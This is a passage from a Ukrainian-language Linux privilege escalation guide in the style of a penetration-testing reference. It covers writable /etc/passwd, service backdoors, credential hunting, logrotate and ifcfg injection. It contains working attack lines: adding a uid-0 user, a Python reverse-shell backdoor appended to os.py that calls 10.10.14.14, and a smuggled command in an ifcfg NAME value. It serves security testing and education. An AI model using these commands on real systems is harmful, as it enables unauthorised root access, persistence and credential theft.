grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Доступний для запису /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наведених нижче команд.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Потім додайте користувача `hacker` і вкажіть згенерований пароль.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер можна скористатися командою `su` з обліковими даними `hacker:hacker`

Також можна скористатися наведеними нижче рядками, щоб додати фіктивного користувача без пароля.\
ПОПЕРЕДЖЕННЯ: це може знизити поточний рівень безпеки машини.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ПРИМІТКА: На платформах BSD `/etc/passwd` розташований у файлах `/etc/pwd.db` і `/etc/master.passwd`, а `/etc/shadow` перейменовано на `/etc/spwd.db`.

Слід перевірити, чи можете ви **записувати до деяких конфіденційних файлів**. Наприклад, чи можете ви записувати до якогось **файлу конфігурації служби**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat у /etc/systemd/,** тоді можна змінити рядки:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Ваш backdoor буде виконано під час наступного запуску tomcat.

### Перевірка каталогів

У таких каталогах можуть міститися резервні копії або цікава інформація: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (імовірно, останній каталог ви не зможете прочитати, але спробуйте)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Незвичне розташування/файли, що належать вам

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Змінені файли за останні хвилини

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Файли баз даних SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

У доступних для читання базах даних застосунків перевірте назви таблиць і стовпців на наявність імен користувачів і хешів паролів. Виявлення хешу, відновлення пароля та підтвердження його повторного використання для локального облікового запису — це окремі кроки; звичайного 32-символьного шістнадцяткового рядка недостатньо, щоб визначити, що це MD5, або зробити висновок про доступ до облікового запису.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Якщо в доступній для читання історії команд оболонки є команда `sudo`, за якою йде короткий рядок, схожий на пароль, вручну перевірте сусідні рядки. Пароль, введений у звичайному запиті `sudo`, не зберігається в історії команд оболонки; наступний рядок може бути лише випадково введеною командою оболонки, а не доказом того, що це дійсний пароль. Файл-маркер `.sudo_as_admin_successful` свідчить про попереднє використання, а не про поточну авторизацію.

### Приховані файли

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Скрипти/бінарні файли в PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Вебфайли**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Резервні копії**

Перевіряйте доступні для читання файли в каталогах резервних копій, а також файли, у **назвах** яких є `backup`: архів із неочевидною назвою або зашифрованим розширенням усе одно може містити старі дані застосунку. Зашифрований архів — лише потенційне джерело витоку. Відновлення пароля, перегляд вмісту, відновлення хешу застосунку та повторне використання цього пароля для облікового запису Unix — окремі кроки, які потрібно перевірити; наявність хешу в архіві не підтверджує можливість локального входу.

Доступні для читання резервні копії віртуальних машин заслуговують на таку саму перевірку. Конфігурація VirtualBox `.vbox` може вказувати на підключені образи `.vdi` та містити метадані зашифрованого ключа диска; [у документації VirtualBox зазначено, що ключ зашифрованих даних зберігається в конфігурації VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Для автономної перевірки диска мають бути доступні і конфігурація, і образ. Гостьовий том може мати власний [рівень шифрування LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), для якого потрібен окремий ключ. Навіть після авторизованого розшифрування старі скрипти чи конфігурації можуть містити пароль; перш ніж вважати це локальним підвищенням привілеїв, з’ясуйте, чи актуальні облікові дані для облікового запису хоста та чи дозволяє ефективна політика `sudo` виконати привілейовану команду. Під час пасивного переліку ресурсів фіксуйте шляхи й дозволи, не копіюючи, не розшифровуючи й не монтувавши образи.

Під час перевірки доступного для читання архіву спершу перегляньте назви файлів у ньому, нічого не розпаковуючи: там можуть бути приховані файли автентифікації, матеріали з кодами відновлення або SSH-ключі, навіть якщо робочі копії захищено. Назви файлів лише вказують на можливий напрямок перевірки; окремо перевірте самі дані та можливе повторне використання облікових даних.

Насамперед перевіряйте **доступні для читання архіви, власником яких є інший користувач**, у каталогах резервних копій, особливо архіви, власником яких є root, і ті, що доступні через членство в групі. Старий архів може містити конфігурацію або секрет автентифікації, навіть якщо робочу копію захищено. Для локального UI резервного копіювання, такого як [Backrest](https://garethgeorge.github.io/backrest/), перевірте, від імені якого облікового запису фактично працює служба, а також чи може користувач із нижчими привілеями читати її конфігурацію або автентифікуватися в UI. Його [хуки](https://garethgeorge.github.io/backrest/docs/hooks) та [інтерфейс команд restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) можуть виконувати операції з файловими й командними привілеями демона; сам факт, що служба прослуховує лише loopback-інтерфейс, не визначає наслідків. `passwordBcrypt` у Backrest — це bcrypt-хеш у кодуванні base64 із його [коду автентифікації](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), а не пароль у відкритому вигляді. Перш ніж вважати відкритий архів або UI межею привілеїв, підтвердьте ідентичність служби, придатність облікових даних і доступ до відповідного плану або репозиторію.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): він шукає **кілька можливих файлів, що можуть містити паролі**.\
**Ще один цікавий інструмент**, який можна використати для цього, — [**LaZagne**](https://github.com/AlessandroZ/LaZagne), застосунок із відкритим вихідним кодом для отримання багатьох паролів, збережених на локальному комп’ютері з Windows, Linux або Mac.

Якщо файл `/etc/guacamole/guacamole.properties` доступний для читання, перевірте параметри підключення до бази даних `mysql-*`, `postgresql-*` або `sqlserver-*`. Якщо обліковий запис має дозвіл на читання таблиць Guacamole JDBC, таблиця `guacamole_connection_parameter` може містити збережені значення SSH `username`, `password`, `private-key` або `passphrase`. Почніть з ідентифікаторів підключень і назв параметрів, а потім перегляньте лише відповідні рядки; збережене значення може бути динамічним токеном або посиланням на сховище, а не секретом, який можна повторно використати. Див. [схему Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) і [параметри SSH-підключення](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Менеджер паролів pswm](https://github.com/Julynx/pswm#usage) за замовчуванням зберігає зашифроване сховище у `~/.local/share/pswm/pswm`. Якщо сховище іншого користувача доступне для перегляду, перевірте його власника й те, чи має ваш обліковий запис реальний доступ до читання. Сам шлях до сховища не розкриває облікові дані: відновлення майстер-пароля, виявлення пароля облікового запису, який можна повторно використати, і підтвердження привілеїв цього облікового запису — це окремі кроки.

[База даних Passpie за замовчуванням](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) розташована в `~/.passpie/`; вона містить зв’язку ключів `.keys` і зашифровані файли облікових даних `.pass` у групових каталогах. Видимий каталог бази даних — це лише зачіпка щодо шляху: перевірте доступ до ключа й потрібного зашифрованого запису, наявність необхідної майстер-фрази та те, чи належать відновлені облікові дані обліковому запису з вищими привілеями. Passpie також підтримує [власні шляхи до баз даних](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), тому шлях за замовчуванням не охоплює всі можливі варіанти. Автоматизоване перебирання має перелічувати метадані, не експортуючи облікові дані й не виводячи матеріали ключів.

### Журнали

Якщо ви можете читати журнали, то, можливо, знайдете в них **цікаву/конфіденційну інформацію**. Що дивніший журнал, то цікавішим він буде (ймовірно).\
Також деякі «**погано**» налаштовані (зі встановленим бекдором?) **журнали аудиту** можуть дозволяти **записувати паролі** в журнали аудиту, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Для **читання журналів група** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Файли оболонки

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Загальний пошук облікових даних/Regex

Також перевірте файли, що містять слово "**password**" у **назві** або вмісті, а також пошукайте IP-адреси й адреси електронної пошти в журналах або хеші за допомогою регулярних виразів.\
Я не буду тут описувати, як усе це робити, але якщо вас цікавить, перегляньте останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде запущено Python-скрипт, і **можете записувати у** цю папку або змінювати Python-бібліотеки, то можете змінити системну бібліотеку й додати до неї бекдор (якщо можете записувати в папку, звідки буде запущено Python-скрипт, скопіюйте туди бібліотеку os.py).

Щоб **додати бекдор до бібліотеки**, просто додайте в кінець бібліотеки os.py такий рядок (змініть IP і PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate exploitation

Привілейоване завдання `logrotate` може створити шлях для запису у файл іншого користувача, якщо під час ротації воно обробляє журнал у каталозі, який користувач із нижчими привілеями може підмінити або перенаправити. Сам факт доступу до запису в журнал — лише підказка. Перевірте точне активне правило та його директиви `create`, `olddir` і `su`; ефективну ідентичність планувальника; права на запис і пошук у батьківському каталозі журналу; а також те, чи дозволяють встановлена збірка та політика змінити цільовий шлях. Щоб запис у startup-файл призвів до виконання команд, пізніше привілейована shell також має завантажити створений файл. Перевірте розклад, правило, версію та пакування, а також метадані шляхів, не запускаючи ротацію і не намагаючись скористатися гонкою.

> [!TIP]
> Не вважайте `3.18.0` чи будь-який рядок версії сам по собі межею експлуатованості. [Журнал змін upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) фіксує посилення захисту каталогів і symlink у кількох випусках, а дистрибутиви можуть переносити виправлення до старіших версій. [Посібник upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) рекомендує використовувати `su`, коли root обертає журнали в каталогах, контрольованих непривілейованими користувачами; перевірте ефективне правило та фактичну поведінку.

Докладнішу інформацію про вразливість наведено на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Скористатися цією вразливістю можна за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(журнали nginx),** тож якщо ви виявили, що можете змінювати журнали, перевірте, хто ними керує, і чи можете ви підвищити привілеї, замінивши журнали на symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Файл `ifcfg-*` — це привід для перевірки, якщо користувач із нижчими привілеями може створити або змінити його **і** привілейований шлях активації мережі зчитує саме цей файл. Перевірте ефективні права на файл і каталог, вибраний інтерфейс, встановлену реалізацію `ifup`/`ifdown` і того, хто її запускає. Сам по собі файл із доступом на запис не призводить до виконання коду. [Посібник Red Hat із мереж RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) розрізняє застарілі мережеві скрипти та NetworkManager: останній сам по собі не запускає перші. [Документація RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) зазначає, що `ifup`/`ifdown` за замовчуванням використовують NetworkManager, а додатковий застарілий пакет надає shell-скрипти.

У системі, де справді використовуються привілейовані застарілі скрипти, присвоєння `ifcfg-*`, яке передається shell без лапок, наприклад `NAME=`, може перетнути межу виконання коду. Перевірте точний парсер, значення та шлях активації; не робіть висновок про інтерпретацію shell лише з назви файлу чи наявності NetworkManager. Обгортка, дозволена через sudo, яка записує введені користувачем дані у файл `ifcfg-*`, а потім викликає застарілий `ifup`, є окремим шляхом до цієї межі, навіть якщо користувач не може редагувати файл безпосередньо.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd і rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування службами Linux**. Він містить скрипти для `start`, `stop`, `restart` і, іноді, `reload` служб. Їх можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов’язаний з **Upstart** — новішою **системою керування службами**, яку створила Ubuntu. Для керування службами вона використовує конфігураційні файли. Попри перехід на Upstart, скрипти SysVinit досі використовуються разом із конфігураціями Upstart завдяки рівню сумісності в Upstart.

**systemd** — це сучасний менеджер ініціалізації та служб із розширеними функціями, як-от запуск демонів на вимогу, керування автомонтуванням і знімки стану системи. Він зберігає файли дистрибутивних пакетів у `/usr/lib/systemd/`, а зміни адміністратора — у `/etc/systemd/system/`, спрощуючи адміністрування системи.<sup>[[21]](#references)</sup>

## Інші прийоми

### **Підвищення привілеїв через NFS**


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Вихід з обмежених Shell


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Фреймворки для rooting Android: зловживання каналом менеджера

Фреймворки для rooting Android зазвичай перехоплюють syscall, щоб надати userspace-менеджеру доступ до привілейованих функцій ядра. Слабка автентифікація менеджера (наприклад, перевірки підпису на основі порядку FD або ненадійні схеми паролів) може дозволити локальному застосунку видати себе за менеджер і отримати root на вже rooted-пристроях. Докладніше про це та експлуатацію — тут:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Виявлення служб VMware Tools через regex-based exec із LPE (CWE-426) (CVE-2025-41244)

Виявлення служб на основі regex у VMware Tools/Aria Operations може отримати шлях до бінарного файлу з командного рядка процесу та виконати його з параметром -v у привілейованому контексті. Надто permissive-шаблони (наприклад, із використанням \S) можуть збігатися з підготовленими зловмисником слухачами у доступних для запису каталогах (наприклад, /tmp/httpd), що призводить до виконання коду від імені root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Докладніше та узагальнений шаблон, застосовний до інших стеків виявлення/моніторингу, — тут:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захист ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Інструменти для Privesc у Linux/Unix

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(параметр -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перелік вразливостей ядра в Linux і MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (фізичний доступ):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Добірка інших скриптів**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (підвищення привілеїв через інтерфейс Crontab, повторне використання облікових даних zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: підроблений payload .text_sig для моніторингу, що запускається через cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: обхід Neighborhood Watch (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Базове підвищення привілеїв у Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Посібник із підвищення привілеїв у Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Атака й захист: методи підвищення привілеїв у Linux у 2016 році](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Ніхто не очікував виконання команди!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (підвищення привілеїв у Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – покроковий розбір лабораторних вправ - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: поради й прийоми для підвищення привілеїв у Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: інструмент для переліку системи та підвищення привілеїв у Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Що таке сокет?](https://www.linux.com/news/what-socket/)
- [15] [Розбір Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Знайомство з D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Підвищення привілеїв у Linux через виконувані файли SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, частина 2 – підвищення привілеїв у Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Як керувати ACL у Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Отримання root у Redhat/CentOS через network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Що таке systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (ін’єкція bash arithmetic через журнали, повний ланцюжок)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Посібник GNU Bash – BASH_ENV (файл запуску для неінтерактивного режиму)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + підвищення привілеїв через symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (копіювання через pg_basebackup у cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Назвіть що завгодно — VMware підвищить привілеї (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: підвищення привілеїв через Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – вразливості Sudo, що дають змогу підвищити привілеї: CVE-2025-32462 і CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – каталоги сховища PYC](https://peps.python.org/pep-3147/)
- [32] [Документація Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Твіт від @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - журналювання паролів у Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - подробиці про race condition у logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
